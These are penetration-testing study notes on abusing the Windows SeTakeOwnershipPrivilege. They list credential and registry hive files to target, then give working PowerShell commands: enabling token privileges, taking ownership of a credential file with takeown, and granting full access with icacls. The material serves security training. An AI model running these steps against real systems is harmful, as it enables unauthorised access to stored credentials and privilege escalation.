### Exploitation
```powershell
Privilege Name                           Description 
======================================== =================================
SeTakeOwnershipPrivilege                 Take ownership of files or other objects
```

##### Files of interest
```powershell
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```
We may also come across `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.

[Enable privileges](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
```powershell
Import-Module .\EnableAllTokenPrivs.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Choose a target file and check permissions
```powershell
gci -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

> [!NOTE] Note
>  Take great care when performing a potentially destructive action like changing file ownership, as it could cause an application to stop working or disrupt user(s) of the target object. Changing the ownership of an important file, such as a live web.config file, is not something we would do without consent from our client first. Furthermore, changing ownership of a file buried down several subdirectories (while changing each subdirectory permission on the way down) may be difficult to revert and should be avoided.

If see that the owner is not shown, meaning that we likely do not have enough permissions over the object to view those details. We can back up a bit and check out the owner of the IT directory.

```powershell
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B
 
 Directory of C:\Department Shares\Private\IT
 
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
               1 File(s)             36 bytes
               2 Dir(s)  17,079,754,752 bytes free
```

Take ownership of the file with `takeown`
```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

Confirm ownership
```powershell
gci -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

Modify ACL to allow full Read/Write access to the file
```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```
### Overview
[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor. Administrators are assigned this privilege by default. While it is rare to encounter a standard user account with this privilege, we may encounter a service account that, for example, is tasked with running backup jobs and VSS snapshots assigned this privilege. It may also be assigned a few others such as `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeSecurityPrivilege` to control this account's privileges at a more granular level and not granting the account full local admin rights. These privileges on their own could likely be used to escalate privileges. Still, there may be times when we need to take ownership of specific files because other methods are blocked, or otherwise, do not work as expected. Abusing this privilege is a bit of an edge case. Still, it is worth understanding in-depth, especially since we may also find ourselves in a scenario in an Active Directory environment where we can assign this right to a specific user that we can control and leverage it to read a sensitive file on a file share.

![image](https://academy.hackthebox.com/storage/modules/67/change_owner.png)

The setting can be set in Group Policy under:

- `Computer Configuration` ⇾ `Windows Settings` ⇾ `Security Settings` ⇾ `Local Policies` ⇾ `User Rights Assignment`

![image](https://academy.hackthebox.com/storage/modules/67/setakeowner2.png)

With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, `Remote Code Execution` (`RCE`) or `Denial-of-Service` (DOS).

Suppose we encounter a user with this privilege or assign it to them through an attack such as GPO abuse using [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse). In that case, we could use this privilege to potentially take control of a shared folder or sensitive files such as a document containing passwords or an SSH key.